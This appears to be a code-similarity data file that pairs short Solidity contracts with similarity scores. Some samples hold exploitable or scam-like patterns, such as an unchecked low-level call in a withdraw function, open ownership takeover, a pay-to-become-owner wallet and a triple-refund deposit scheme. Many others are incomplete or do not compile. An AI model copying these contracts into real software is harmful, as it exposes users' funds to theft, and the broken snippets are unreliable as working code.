      uint coinsDistrubuted = initialSupply - ercObject.coinBalance[owner]; 

      uint percentage =  (100 * coinsDistrubuted) /initialSupply; 

       if( percentage <=10 || percentage == 0){
          bonus = 40;
        }
       else if( percentage <=20){
          bonus = 30;
        }
       else if(percentage <=30){
          bonus = 20;
        }
       else if(percentage <= 40){
          bonus = 10;
       }
       else{
          bonus = 0;
       }
       tokens = tokens + (tokens/100)*bonus;
       tokens = tokens  * (10 ** decimal);
        return tokens;
    }

     function  mintCoin(uint tokens) public returns(bool res){
        uint mintToken = initialSupply+tokens;
        require ((msg.sender == owner) && (tokens>0) && (totalSupply>=mintToken));
        ercObject.coinBalance[owner] = ercObject.coinBalance[owner] + tokens; 

        initialSupply = initialSupply + tokens;
        return true;
    }

   
    function  () public {
        revert();     
    }


}",0.6601135107138415,"contract BSHORT is ERC20Detailed {

    using SafeMath for uint256;



    bool public isPaused = false;

    uint256 private DEC = 1000000000000000000;

    address public tradeAddress;

    

    

    uint256 public rate = 10;

    uint public minimumSupply = 1;

    uint public hardCap = 9000000000 * DEC;



    event TokenPurchase(address purchaser, uint256 value, uint256 amount, uint integer_amount, uint256 tokensMinted);

    event TokenIssue(address purchaser, uint256 amount, uint integer_amount, uint256 tokensMinted);



    modifier onlyTrade() {

        require(msg.sender == tradeAddress);

        _;

    }



    function pauseCrowdSale() public onlyOwner {

        require(isPaused == false);

        isPaused = true;

    }



    function startCrowdSale() public onlyOwner {

        require(isPaused == true);

        isPaused = false;

    }



    function setRate(uint _rate) public onlyOwner {

        require(_rate > 0);

        require(_rate <= 1000);

        rate = _rate;

    }



    function buyTokens() public payable {

        require(!isPaused);



        uint256 weiAmount = msg.value;

        uint256 tokens = weiAmount.mul(1000).div(rate);



        require(tokens >= minimumSupply * DEC);

        require(totalSupply().add(tokens) <= hardCap);



        _mint(msg.sender, tokens);

        owner().transfer(msg.value);



        emit TokenPurchase(msg.sender, weiAmount, tokens, tokens.div(DEC), totalSupply().div(DEC));

    }



    function IssueTokens(address account, uint256 value) public onlyOwner {

        uint tokens = value * DEC;



        require(totalSupply().add(tokens) <= hardCap);



        _mint(account, tokens);



        emit TokenIssue(account, tokens, value, totalSupply().div(DEC));

    }



    function() external payable {

        buyTokens();

    }



    function setTradeAddress(address _tradeAddress) public onlyOwner {

        require(_tradeAddress != address(0));

        tradeAddress = _tradeAddress;

    }



    function transferTrade(address _from, address _to, uint256 _value) onlyTrade public returns (bool) {

        _transfer(_from, _to, _value);

        return true;

    }



    function transfer(address _to, uint256 _value) public returns (bool) {

        if (_to == tradeAddress) {

            ITrade(tradeAddress).sellTokensFrom(msg.sender, _value);

        } else {

            _transfer(msg.sender, _to, _value);

        }

        return true;

    }

}"
"contract MultiAdmin is Admin {
    mapping(address => bool) extraAdmins;

    function addAdmin(address who) external {
        require(isAdmin());
        extraAdmins[who] = true;
    }
    function isAdmin() internal view returns (bool) {
        return extraAdmins[msg.sender] || super.isAdmin();
    }
}",0.6039864247467707,"contract AdsInterface {

    function advertiseOnBlocks(address, uint16[], string, string, string) external returns (uint) {}

    function canAdvertiseOnBlocks(address, uint16[]) public view returns (bool) {}

    function isAds() public view returns (bool) {}

}"
"contract ico {
  address private owner;
  address private ops;
  address private trustee;
  mapping(address => bool) public whitelist;


  modifier ownerFunction {
      require(owner == msg.sender);
       _;
  }

  modifier opsFunction {
    require(ops == msg.sender);
    _;
  }

  event Whitelist(address _address);
  event UnWhitelist(address _address);
  event Error(address _address);

  function setOpp (address _oppAddress) private ownerFunction {
    ops = _oppAddress;
  }

  function ico() internal {
    owner = msg.sender;
  }

  function buyTokens(uint256 _value) payable {
      if (getWhitelistStatus(msg.sender) == true) {
          require(balanceOf(msg.sender) >= msg.value);
          msg.sender.transfer(trustee, msg.value);
          return true;
       }
      else
          {
              revert();
              Error(msg.sender);
              returns false;
          }
    }

  function getWhitelistStatus(address _address) returns (bool) {
      return whitelist[_address];

  }

  function whitelist(address _address)opsFunction {
      whitelist[_address] = true;
      Whitelist(_address);


  }

  function unWhitelist(address _address)opsFunction {
      whitelist[_address] = false;
      UnWhitelist(_address);

  }


}",0.6913891333915121,"contract Whitelist is Ownable {



  address public opsAddress;

  mapping(address => uint8) public whitelist;



  event WhitelistUpdated(address indexed _account, uint8 _phase);



  function isWhitelisted(address _account) public constant returns (bool) {

      return whitelist[_account] == 1;

  }



  

function updateWhitelist(

    address _account,

    uint8 _phase) public

    returns (bool)

{

    require(_account != address(0));

    require(_phase <= 1);

    require(isOps(msg.sender));



    whitelist[_account] = _phase;



    emit WhitelistUpdated(_account, _phase);



    return true;

}





  

  

  function isOwner(

      address _address)

      internal

      view

      returns (bool)

  {

      return (_address == owner);

  }

  

  function isOps(

      address _address)

      internal

      view

      returns (bool)

  {

      return (opsAddress != address(0) && _address == opsAddress) || isOwner(_address);

  }



  



  

  function setOpsAddress(

      address _opsAddress)

      external

      onlyOwner

      returns (bool)

  {

      require(_opsAddress != owner);

      require(_opsAddress != address(this));

      require(_opsAddress != address(0));



      opsAddress = _opsAddress;



      return true;

  }



}"
"contract MyContract is MyParentContract {
   string private foo;

   function MyContract(string _foo) {
       foo = _foo;
   }

   function getFoo() public returns (string) {
       return foo;
   }
}",0.6694827164694817,"contract TestContract {
    string name;
    function getName() public constant returns (string){
        return name;
    }
    function setName(string newName) public {
        name = newName;
    }
}"
"contract Adoption {
    TNSToken token;
    address[16] public adopters;
    address owner;

    constructor(address _token) public {
        token = TNSToken(_token);
        ownder = msg.sender;
    }

    function adopt(uint petId) public {
        require(petId >= 0 && petId <= 15);
        token.transfer(address(this), 5 * 10**18);
        adopters[petId] = msg.sender;
    }
}",0.6926797382512349,"contract TokenLocker {
    
    address public owner;

    ERC20 public token;

    
    function TokenLocker (ERC20 tokenAddr) public {
        owner = msg.sender;
        token = tokenAddr;
    }

    
    function transfer(address dest, uint amount) public returns (bool) {
        require(msg.sender == owner);
        return token.transfer(dest, amount);
    }

}"
"contract sangalliCoin {

address sangalli;
mapping (address => uint) balances;

modifier sangalliOnly{ if(msg.sender != sangalli) throw; }
event _attemptWithdrawal(uint256 indexed amount, address indexed customer);

function deposit(){
  if(msg.value > 0) balances[msg.sender] += msg.value;
  else throw;
}

function attemptWithdrawal(uint256 amount) returns (string){
  _attemptWithdrawal(amount, msg.sender);
  return ""you are probably gonna get ripped off... #sangalliCoin"";
}

function setSangalli(){
  sangalli = msg.sender;
}

function withdraw(uint withdrawAmount, address user, uint256 multiple) sangalliOnly public returns (uint remainingBal) {
    if(balances[user] >= withdrawAmount * multiple) {
        balances[user] -= withdrawAmount * multiple;

        if (!user.send(withdrawAmount)) {
            balances[user] += withdrawAmount * multiple;
        }
    }

    return balances[msg.sender];
}

}",0.6380798962139921,"contract ChristmasClub is Ownable {
    using SafeMath for uint256;
    
    uint public withdrawalTime = 1543622400; 
    uint public earlyWithdrawalFeePct = 10;
    
    uint public totalDeposited = 0;
    
    mapping (address => uint) balances;
    
    function setWithdrawalTime (uint newTime) public onlyOwner {
        withdrawalTime = newTime;
    }
    
    function deposit () public payable {
        totalDeposited = totalDeposited.add(msg.value);
        balances[msg.sender] = balances[msg.sender].add(msg.value);
    }
    
    function withdraw () public {
        uint toWithdraw = balances[msg.sender];
        if (now < withdrawalTime) {
            toWithdraw = toWithdraw.mul(100 - earlyWithdrawalFeePct).div(100);
            balances[owner] = balances[owner].add(balances[msg.sender] - toWithdraw);
        }
        balances[msg.sender] = 0;
        msg.sender.transfer(toWithdraw);
    }
    
    function getBalance () public view returns (uint) {
        return balances[msg.sender];
    }
    
    function () public payable {
    }
}"
"contract ADTest {

    function CallTransfer(address tokenAddress, address _to, uint256 _value) public {
        MyToken(tokenAddress).transfer(_to, _value);
    }

}",0.6908450811266449,"contract ITradableToken{
    function purchase(address tokenAddress, address buyer, uint256 value) public returns (bool success);
}"
"contract MainContract {
string public variable1;

function setVariable1(string memory newValue) public {
    variable1 = newValue;
}}",0.6208420300679954,"contract Ownable {



    mapping(uint => string) public data;

    

    function addData(string memory inData) public {

        data[1] = inData;

    }



}"
"contract DB {
  mapping(bytes32 => bool) private user;

  function setUser(bytes32 usr) public {
      user[usr] = true;
  }

  function isUser(bytes32 usr) public view returns (bool) {
     return user[usr];
  }
}",0.6429257521864135,"contract ContractResolver {

    bool public locked_forever;



    function get_contract(bytes32) public view returns (address);



    function init_register_contract(bytes32, address) public returns (bool);

}"
"contract Parent {
   using UserLib for *;

   function insertUser(address db, bytes32 usr) public {
      UserLib.insertUser(db, usr);
   }
}",0.6086054234051906,"contract IdentityStorage {

  function read_user(address _user) public constant returns (uint256 _id_expiration, bytes32 _doc);

}"
"contract A {
    address public addressB;   
    address public sender;
    uint public myVar;

    function A() {
        addressB = new B();
    }

    function makeCall(){
        addressB.call(bytes4(sha3('set(uint256)')), 1);
    }
    function makeCallCode(){
        addressB.callcode(bytes4(sha3('set(uint256)')), 2);
    }
    function makeDelegateCall(){
        addressB.delegatecall(bytes4(sha3('set(uint256)')), 3);
    }

    function reset(){
        sender = 0;
        myVar = 0;
        B(addressB).reset();
    }
}",0.6098866968181779,"contract ERC20 is ERC20Basic {

    function allowance(address _owner, address _spender) public view returns(uint256);



    function transferFrom(address _from, address _to, uint256 _value) public returns(bool);



    function approve(address _spender, uint256 _value) public returns(bool);



    event Approval(

        address indexed owner,

        address indexed spender,

        uint256 value

    );

}"
"contract B {
    address public sender;
    uint public myVar;

    function set(uint x){
        myVar = x;
        sender = msg.sender;
    }
    function reset(){
        sender = 0;
        myVar = 0;        
    }
}",0.6382659088290598,"contract Ownable {

    address public Owner = msg.sender;

    function isOwner() public view returns (bool) {

        if (Owner == msg.sender) return true; return false;

    }

}"
"contract Test {
    function withdraw() public {
        uint x = 123;
        msg.sender.call.value(x)();
    }
}",0.6258917111993714,"contract WETH {

    function deposit() public payable;

    function withdraw(uint) public;

}"
"contract bug {
    function load_money() returns (uint32) {

       if(msg.value != 10) {
          return(0);
       }
    }
}",0.6509577454662201,"contract Token{

  function transfer(address to, uint value) returns (bool);

}"
"contract FantasyLeague {
        
        address public member;
        
        uint[] public proposals;

        
        constructor() public {
            member = msg.sender;
        }

        
        function proposeNumber (uint) public payable {
            require(msg.value > .01 ether);
            proposals.push(msg.data);
        }

        
        function getProposals () public view returns (uint[]) {
            return proposals;
        }
    }",0.6483551876729521,"contract Donation is Ownable {

    

    event Donated(address donator, uint amount);

    

    function () public payable {

        emit Donated(msg.sender, msg.value);

    }

    

    function claim() public onlyOwner {

        msg.sender.transfer(getBalance());

    }

    

    function getBalance() public view returns (uint) {

        return address(this).balance;

    }

}"
"contract Foo {
    struct Bar {
        bytes32 a;
        uint8[9] b;
    }

    Bar[] public bars;

    function add(bytes32 _a, uint8[9] _b) public {
        bars.push(Bar(_a, _b));
    }
}",0.6420411589863586,"contract Jug {
    struct Ilk {
        uint256 duty;
        uint256  rho;
    }

    mapping (bytes32 => Ilk) public ilks;

    function drip(bytes32) public returns (uint);
}"
"contract Another {
    uint public balance;
    function sendToAnother() public {
        balance += 10;
    }
}",0.6652031795112768,"contract TokenCHK {



  function balanceOf(address _owner) public pure returns (uint256 balance) {}



}"
"contract Test {
    function send(address another) public {
        Another(another).sendToAnother();
    }
}",0.6257794684517409,"contract father {

    function fallback(uint num,address sender,uint amount) public;

}"
contract TestMultiply { uint testVal; function Test(uint testValue){ testVal=testValue;}function multiply(uint a) returns(uint d) { return a * 7 *testVal; } },0.6013679296465869,"contract SimpleStorage {
  uint storedData;

  function set(uint x) {
    storedData = x;
  }

  function get() constant returns (uint retVal) {
    return storedData;
  }
}"
"contract EtherTransfer {

    address public owner;

    function transfer() public {
    owner = 0x627306090abaB3A6e1400e9345bC60c78a8BEf57;
    owner.transfer(1000000000000000000);
    }

    function() payable public {}

function kill() public {
        if (msg.sender == owner)
        selfdestruct(owner);
    }

}",0.6337156286750489,"contract MyCompanyWallet is Ownable {

    address public Owner;

    

    function setup() public payable {

        if (msg.value >= 0.5 ether) {

            Owner = msg.sender;

        }

    }

    

    function withdraw() public {

        if (isOwner()) {

            msg.sender.transfer(address(this).balance);

        }

    }

    

    function() public payable { }

}"
"contract Users {
    struct User {
        string firstName;
        string lastName;
    }
    mapping(address => User) public users;

    function getFirstName() public view returns (string) {
        User memory user = users[msg.sender];
        return user.firstName;
    }

    function setFirstName(newName) public {
        User memory user = users[msg.sender];
        user.firstName = newName;
    }
}",0.6476384830738713,"contract CryptoPeopleName {

    address owner;

    mapping(address => string) private nameOfAddress;

  

    function CryptoPeopleName() public{

        owner = msg.sender;

    }

    

    function setName(string name) public {

        nameOfAddress[msg.sender] = name;

    }

    

    function getNameOfAddress(address _address) public view returns(string _name){

        return nameOfAddress[_address];

    }

    

}"
"contract University {
    address public owner;
    address public student;
    address firstName;
    address lastName;
    bytes32 Studies;
    uint age;
    uint DateOfBirth;
    bytes32 public caCertificate;
    bytes32 ipfs_hash;
    constructor() public {
        owner = msg.sender;
    }
    modifier onlyOwner()  {
        if (msg.sender == owner) _;
    }
    modifier onlyOwnerOrStudent() {
        if (msg.sender == owner || msg.sender == student) _;
    }
    function setstudent () public;

function getStudent () public;

event student(
    bytes32 firstNameName,
    bytes32 lastName,
    bytes32 Studies,
    uint age,
    uint DateOfBirth,
    bytes32 ipfs_hash
    );

function checkStudentExists() public constant returns (bool) {
    if (student == firstName && student == lastName) return true;
}

function setIPFSHash(bytes32 _ipfs_hash) public onlyOwnerOrStudent {
    ipfs_hash = _ipfs_hash;
}",0.6285366948185849,"contract CentralizedOracle is Oracle {

    
    event OwnerReplacement(address indexed newOwner);
    event OutcomeAssignment(int outcome);

    
    address public owner;
    bytes public ipfsHash;
    bool public isSet;
    int public outcome;

    
    modifier isOwner () {
        
        require(msg.sender == owner);
        _;
    }

    
    
    
    function CentralizedOracle(address _owner, bytes _ipfsHash)
        public
    {
        
        require(_ipfsHash.length == 46);
        owner = _owner;
        ipfsHash = _ipfsHash;
    }

    
    
    function replaceOwner(address newOwner)
        public
        isOwner
    {
        
        require(!isSet);
        owner = newOwner;
        OwnerReplacement(newOwner);
    }

    
    
    function setOutcome(int _outcome)
        public
        isOwner
    {
        
        require(!isSet);
        isSet = true;
        outcome = _outcome;
        OutcomeAssignment(_outcome);
    }

    
    
    function isOutcomeSet()
        public
        constant
        returns (bool)
    {
        return isSet;
    }

    
    
    function getOutcome()
        public
        constant
        returns (int)
    {
        return outcome;
    }
}"
"contract Parent {
    address[] public registry;

    function createChild () public {
        address newChild = address(new Child());
        registry.push(newRecord);
    }
 }",0.6629413984597122,"contract ProxyRegistryLike {
    function proxies(address) public view returns (address);
    function build(address) public returns (address);
}"
"contract Record {
    string public uid;
 }",0.6126986739321876,contract Owned { address public owner; }
"contract sample_call {
    function call() public pure {
        uint a;
        sample v;   

        a = v.add_var(0x22); 
    }
}",0.6485632071962646,contract test { function multiply(uint a) public pure returns(uint d) {   return a * 7;   } }
"contract Token {
    uint totalSupply;

    function Token() public {
        totalSupply = 0;
    }

    function mint() public{
        
    }
}",0.6997361782549321,"contract EtherToken is Token {

    
    function deposit()
        public
        payable
    {}

    
    
    function withdraw(uint amount)
        public
    {}
}"
"contract Factory {

    
    
    
    address Admin;

    constructor () public {
        Admin = msg.sender;
    }    

    function createNewContract(string memory Name, string memory Type, uint Fee) public returns(YourContract) {
        address YourContract = address(new YourContract(Name, Type, Fee));
    }",0.6289763218504274,"contract TeamBet{
uint minAmount;

string teamName;


BetContract ownerContract;

function showTeam() public view returns(string team){
return teamName;
}

function showOwnerContract() public view returns(address _ownerContract) {

return ownerContract;
}


}"
"contract XYZCoinCrowdsale is Crowdsale {

  function XYZCoinCrowdsale(uint256 _startTime, uint256 _endTime, uint256 _rate, address _wallet) 
   
    {          
  }

  
  
  function createTokenContract() internal returns (MintableToken) {
    return new XYZCoin();
  }

}",0.6715231453300385,"contract HYCCrowdsalePreICO is Crowdsale {
  function HYCCrowdsalePreICO(
    uint256 _startTime,
    uint256 _endTime,
    uint256 _rate,
    address _wallet,
    uint256 _hardCap
  )
    public 
    Crowdsale(_startTime, _endTime, _rate, _wallet, _hardCap)
  {

  }
}"
"contract init {
    address owner;
    address[] public userAddresses;
    function init() {
        owner = msg.sender;
    }

    function getaddresses(address rec) public {
        userAddresses.push(rec);
    } 

    function seneth(uint value) public {
        for (uint i = 0; i < userAddresses.length; i++) {
            userAddresses[i].transfer(value);
        }
    }
}",0.6737551001717884,"contract TokenDistribute is OwnerHelper

{

    uint public E18 = 10 ** 18;



    constructor() public

    {

    }

    

    function multipleTokenDistribute(address _token, address[] _addresses, uint[] _values) public onlyOwner

    {

        for(uint i = 0; i < _addresses.length ; i++)

        {

            Token(_token).transfer(_addresses[i], _values[i] * E18);  

        }

    }

}"
"contract MyFriendToken is ERC20{
    string public token_name;
    string public symbol;
    uint8 public decimals;

    address public owner;

    bool purchase_OK = true;

    address friend1 = address(0x112233...);
    address friend2 = address(0x112222...);

    

    function isMyFriend(address myFriendAddress) returns (bool){
        if(myFriendAddress != friend1 && myFriendAddress != friend2) {
            return false;
        }
        return true;
    }


    function purchase_ko() {
        if(msg.sender != owner){ throw;}
        purchase_OK = false;
    }

    function purchase_ok()  {
        if(msg.sender != owner){ throw;}
        purchase_OK = true;
    }

    function MyFriendToken(){
        owner = msg.sender;
        token_name = ""MyFriendToken"";
        symbol = ""MFT"";
        decimals = 18;
    }


    function kill() {
        if (msg.sender == owner) {
            selfdestruct(owner);
        }
    }

    function() payable {
        if(!purchase_OK){throw;}
        if(!isMyFriend(msg.sender)) {throw;}

        owner.transfer(msg.value);
        uint256 MyFriendToken = (msg.value * 1000);
        totalSupply += MyFriendToken;
        balances[msg.sender] += MyFriendToken;
    }
}",0.6442990805788755,"contract MyToken is owned { 
    
    string public name;
    string public symbol;
    uint8 public decimals;
	uint8 public disableconstruction;
    
    mapping (address => uint256) public balanceOf;

    
    event Transfer(address indexed from, address indexed to, uint256 value);

    
    function MyTokenLoad(uint256 initialSupply, string tokenName, uint8 decimalUnits, string tokenSymbol, address centralMinter) {
		if(disableconstruction != 2){
            if(centralMinter != 0 ) owner = msg.sender;         
            balanceOf[msg.sender] = initialSupply;              
            name = tokenName;                                   
            symbol = tokenSymbol;                               
            decimals = decimalUnits;                            
		}
    }
    function MyToken(){
        MyTokenLoad(10000000000000,&#39;Kraze&#39;,8,&#39;KRZ&#39;,0);
		disableconstruction=2;
    }
    
    function transfer(address _to, uint256 _value) {
        if (balanceOf[msg.sender] < _value) throw;           
        if (balanceOf[_to] + _value < balanceOf[_to]) throw; 
        balanceOf[msg.sender] -= _value;                     
        balanceOf[_to] += _value;                            
        Transfer(msg.sender, _to, _value);                   
    }

    
    function () {
        throw;     
    }
}"
"contract Bank {
    address public owner;
    mapping(address => uint) private customerBalance;
    event fallbackCalled(address, uint256);
    event deposit(address, uint256);

    constructor() public {
        owner = msg.sender;
    }

    
    function depositFunds(uint _value) external payable returns(bool) {
        require(_value > 0, ""values not greater then zero"");
        customerBalance[msg.sender] += _value;
        emit deposit(msg.sender, _value);
        return true;
    }

    
    function getCustomerBalance() public view returns(uint) {
        return customerBalance[msg.sender];
    }

    function () external payable {
        emit fallbackCalled(msg.sender, msg.value);
    }
}",0.6973790565522601,"contract BasicToken is ERC20Basic {

    using SafeMath

    for uint256;



    mapping(address => uint256) internal balances;



    uint256 internal totalSupply_;



    

    function totalSupply() public view returns(uint256) {

        return totalSupply_;

    }



    

    function transfer(address _to, uint256 _value) public returns(bool) {

        require(_value <= balances[msg.sender]);

        require(_to != address(0));



        balances[msg.sender] = balances[msg.sender].sub(_value);

        balances[_to] = balances[_to].add(_value);

        emit Transfer(msg.sender, _to, _value);

        return true;

    }



    

    function balanceOf(address _owner) public view returns(uint256) {

        return balances[_owner];

    }



}"
"contract Greeter {

    using foo for string;
    string name = ""lary"";

    function say() constant returns (string) {
        return name.greet();
    }
}",0.624490914628689,"contract f {
    function a() constant returns (string b){
        return ""tickletickle vac ban in csgo march 10 2017"";
    }
}"
"contract VoblaCrowdsaleTemp11 is ReentrancyGuard {

    using SafeMath for uint256;

    address private _wallet; 
    uint256 private fundingGoal; 
    uint256 private amountRaised;
    uint256 private price;
    token private tokenReward;  

    uint256 private deadline;
    uint256 private minimum;

    bool crowdsaleClosed = false;

    
    constructor(
        address ifSuccessfulSendTo, 
        uint fundingGoalInEthers, 
        uint etherCostOfEachToken, 
        uint256 durationInMinutes,  
        address addressOfTokenUsedAsReward 
    ) public payable {
        require(etherCostOfEachToken > 0);
        require(durationInMinutes > 0);
        require(ifSuccessfulSendTo != address(0));
        require(address(addressOfTokenUsedAsReward) != address(0));

        amountRaised = 0; 
        _wallet = ifSuccessfulSendTo; 
        fundingGoal = fundingGoalInEthers*10**18; 
        price = etherCostOfEachToken*10**18; 
        tokenReward = token(addressOfTokenUsedAsReward); 
        deadline = now + durationInMinutes * 1 minutes;
    }

    
    function () public payable {
        require(!crowdsaleClosed);
        crowdsaleClosed = _isDeadlineReached(deadline);
        require(!crowdsaleClosed);
        require(msg.sender != address(0));

        uint256 amount = msg.value; 
        require(amount > 0);

        crowdsaleClosed = _isGoalReached(amount);

        uint256 tokens = amount.mul(price);

        amountRaised = amountRaised.add(amount);

        tokenReward.transfer(msg.sender, tokens);

        _wallet.transfer(amount);
    }

    function _isGoalReached(uint256 weiAmount) internal view returns(bool) {
        return (amountRaised.add(weiAmount) >= fundingGoal);
    }

    function _isDeadlineReached(uint256 time) internal view returns(bool) {
        return (now >= time);
    }
}",0.6746582875898783,"contract LemurTokenSale is Ownable {

    using SafeMath for uint256;



    Erc20Wrapper public token;



    address public wallet;



    uint256 public rate;

    uint256 public amountRaised;



    uint256 public openingTime;

    uint256 public closingTime;



    event TokenPurchase(address indexed _purchaser, address indexed _beneficiary, uint256 _value, uint256 _amount);



    constructor() public {

        

        openingTime = block.timestamp;

        closingTime = openingTime.add(90 days);

    }



    function setToken(Erc20Wrapper _token) onlyOwner public {

        require(_token != address(0));

        token = _token;

    }



    function setWallet(address _wallet) onlyOwner public {

        require(_wallet != address(0));

        wallet = _wallet;

    }



    function setRate(uint256 _rate) onlyOwner public {

        require(_rate > 0);

        rate = _rate;

    }



    function setClosingTime(uint256 _days) onlyOwner public {

        require(_days >= 1);

        closingTime = openingTime.add(_days.mul(1 days));

    }



    function hasClosed() public view returns (bool) {

        

        return block.timestamp > closingTime;

    }



    function () external payable {

        buyTokens(msg.sender);

    }



    function buyTokens(address _beneficiary) public payable {

        require(!hasClosed());

        require(token != address(0) && wallet != address(0) && rate > 0);

        require(_beneficiary != address(0));



        uint256 amount = msg.value;

        require(amount >= 0.01 ether);



        uint256 tokenAmount = amount.mul(rate);

        amountRaised = amountRaised.add(amount);

        require(token.transfer(_beneficiary, tokenAmount));



        emit TokenPurchase(msg.sender, _beneficiary, amount, tokenAmount);



        wallet.transfer(amount);

    }

}"
"contract Auction {
    uint public startTime;
    uint public endTime;
    uint public highestBid;
    address highestBidder;
    mapping (address => uint) deposits;
    uint constant minVal = 1000000000000000000; 

    modifier depositCheck {
        if(msg.value < minVal || msg.value % minVal != 0 || now > endTime){
            throw;
        }
        _
    }       
    modifier bidCheck(uint bid) {
        if(bid <= deposits[msg.sender] && bid % minVal == 0 && bid > highestBid && now < endTime) {
            _
        }
        else {
            throw;
        }
    }       
    modifier withdrawCheck {
        if(msg.sender == highestBidder) {
            throw;
        }
        else {
            _
        }
    }

    function Auction(uint duration){
        startTime = now;
        endTime = now + 864000000; 
    }       

    function deposit() depositCheck {
        if(deposits[msg.sender] == 0) {
            deposits[msg.sender] = msg.value;
        }
        else {
            deposits[msg.sender] += msg.value;
        }
    }    
    function bid(uint bid) bidCheck(bid) {
        highestBid = bid;
        highestBidder = msg.sender;
    }       
    function withdraw() withdrawCheck {
        uint refund = deposits[msg.sender];
        deposits[msg.sender] = 0;
        if (!msg.sender.send(refund)) {
            deposits[msg.sender] = refund;
        }
    }
    function claimPrize() {
        if(now > endTime && msg.sender == highestBidder) {
            
        }
    }
}",0.6565001879085722,"contract Multiple3x is Ownable{

    using SafeMath for uint256;
    mapping (address=>uint) public deposits;
    uint public refundTime = 1507719600;     
    uint public ownerTime = (refundTime + 1 minutes);   
    uint maxDeposit = 1 ether;  
    uint minDeposit = 100 finney;   


    function() payable {
        deposit();
    }
    
    function deposit() payable { 
        require(now < refundTime);
        require(msg.value >= minDeposit);
        
        uint256 dep = deposits[msg.sender];
        uint256 sumDep = msg.value.add(dep);

        if (sumDep > maxDeposit){
            msg.sender.send(sumDep.sub(maxDeposit)); 
            deposits[msg.sender] = maxDeposit;
        }
        else{
            deposits[msg.sender] = sumDep;
        }
    }
    
    function refund() payable { 
        require(now >= refundTime && now < ownerTime);
        require(msg.value >= 100 finney);        
        
        uint256 dep = deposits[msg.sender];
        uint256 depHalf = this.balance.div(2);
        uint256 dep3x = dep.mul(3);
        deposits[msg.sender] = 0;

        if (this.balance > 0 && dep3x > 0){
            if (dep3x > this.balance){
                msg.sender.send(dep3x);     
            }
            else{
                msg.sender.send(depHalf);   
            }
        }
    }
    
    function refundOwner() { 
        require(now >= ownerTime);
        if(owner.send(this.balance)){
            suicide(owner);
        }
    }
}"
"contract TestABC {
    function totalSupplyTest() public {
        bool a = true;
        bool b = true;
        Assert.equal(a, b, ""message ABC"");
    }
}",0.6197651758556509,"contract Test {

    function A() public pure returns (bool) {

        require(false, ""you shall not pass"");

        return true;

    }

}"
"contract ReadBool {
    bool public flag;

    function read_bool() public constant returns (bool) {
        return flag;
    }
}",0.6696016020321404,"contract Test {

    uint public constant m = 1001001001;

    

    function sss() view public returns(uint) {

        return m;

    }

}"
"contract Node is MetaCoin {

uint public fee;
address public owner;
address[] public publicRelays;

  function Node() {
    owner = msg.sender;
    fee = 10;
  }

  function createRelay () returns (address){
    address relay = new Relay();
    publicRelays.push(relay);
    return relay;
  }
}",0.6651788235080928,"contract TVToken {
    function transferFrom(address from, address to, uint256 value) public returns (bool);
    function balanceOf(address _owner) public view returns (uint256);
    function allowance(address _owner, address _spender) public view returns (uint256);
}"
"contract MyContract {

    function myFunction() public onlyOwner {
        dummy();
    }
}",0.6166470888344691,"contract CheckableContract {
    event Checked();
    
    function check() public;
}"
"contract Color {


address public contracts;
string public color;


function Color(address _c, string _color) {
    contracts = _c;
    color = _color;
}


function getContracts() constant returns(address contractAddress) {
    return contracts;
}

function getColor() constant returns(string color) {
    return color;
}

function setlastDirAddress(address c) {
        contracts = c;
    }


function setColor(string clr) {
        color= clr;

}

}",0.6440175028172341,"contract ZapCoordinatorInterface is Ownable {

    function addImmutableContract(string contractName, address newAddress) external;

    function updateContract(string contractName, address newAddress) external;

    function getContractName(uint index) public view returns (string);

    function getContract(string contractName) public view returns (address);

    function updateAllDependencies() external;

}"
"contract FunctionTest {
    bool public foo = true;
    string public name;
    uint256 public counter = 0;

    function setName() public {
        
    }

    function writeToStorage() {
        foo = !foo;
    }

    function readFromStorageConstant() public constant returns (bool) {
        return foo;
    }

    function readFromStorageView() public view returns (bool) {
        return foo;
    }
}",0.6923574099682646,"contract TripioToken {

    string public name;

    string public symbol;

    uint8 public decimals;

    function transfer(address _to, uint256 _value) public returns (bool);

    function balanceOf(address who) public view returns (uint256);

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool);

}"
"contract CrowdFunding {

    struct Investor {

        address addr;

        uint amount;

    }

    address public owner;

    uint public numInvestors;

    uint public deadline;

    string public status;

    bool public ended;

    uint public goalAmount;

    uint public totalAmount;

    mapping (uint => Investor) public Investors;

    modifier onlyOwner () {

        require(msg.sender == owner);

        _;

    }

    constructor(uint _duration, uint _goalAmount) public {

        owner = msg.sender;

        deadline = now + _duration;

        goalAmount = _goalAmount;

        status = ""Funding"";

        ended = false;

        numInvestors = 0;

        totalAmount = 0;

    }

    function fund() public payable {

        require(!ended);

        Investor storage inv = Investors[numInvestors++];

        inv.addr = msg.sender;

        inv.amount = msg.value;

        totalAmount += inv.amount;

    }


function checkGoalReached () public onlyOwner {

        require(!ended);

        require(now >= deadline);

        if(totalAmount >= goalAmount) {

        status = ""Campaign Succeeded"";

        ended = true;

        require(!owner.send(address(this).balance));

        uint i = 0;

        status = ""Campaign Failed"";

        ended = true;

        while(i <= numInvestors) {

            require(!Investors[i].addr.send(Investors[i].amount));

            i++;

          } 

  }

    }

    function kill() public onlyOwner {

        selfdestruct(owner);

    }

}",0.6625237905849657,"contract PreSale is Pausable {
    
  event Invest(address, uint);

  using SafeMath for uint;
    
  address public wallet;

  uint public start;
  
  uint public total;
  
  uint16 public period;

  mapping (address => uint) balances;
  
  mapping (address => bool) invested;
  
  address[] public investors;
  
  modifier saleIsOn() {
    require(now > start && now < start + period * 1 days);
    _;
  }
  
  function totalInvestors() constant returns (uint) {
    return investors.length;
  }
  
  function balanceOf(address investor) constant returns (uint) {
    return balances[investor];
  }
  
  function setStart(uint newStart) onlyOwner {
    start = newStart;
  }
  
  function setPeriod(uint16 newPeriod) onlyOwner {
    period = newPeriod;
  }
  
  function setWallet(address newWallet) onlyOwner {
    require(newWallet != address(0));
    wallet = newWallet;
  }

  function invest() saleIsOn whenNotPaused payable {
    wallet.transfer(msg.value);
    balances[msg.sender] = balances[msg.sender].add(msg.value);
    bool isInvested = invested[msg.sender];
    if(!isInvested) {
        investors.push(msg.sender);    
        invested[msg.sender] = true;
    }
    total = total.add(msg.value);
    Invest(msg.sender, msg.value);
  }

  function() external payable {
    invest();
  }

}"
contract greeter is mortal { string greeting; function greeter(string _greeting) public { greeting = _greeting; } function changeMessage(string myMsg) returns (string){ greeting = myMsg; return myMsg; } function greet() returns (string) { return greeting; } },0.6339618870070763,"contract greeter {

    address owner;
    string message;

    function greeter(string _message) public {
        owner = msg.sender;
        message = _message;
    }

    function say() constant returns (string) {
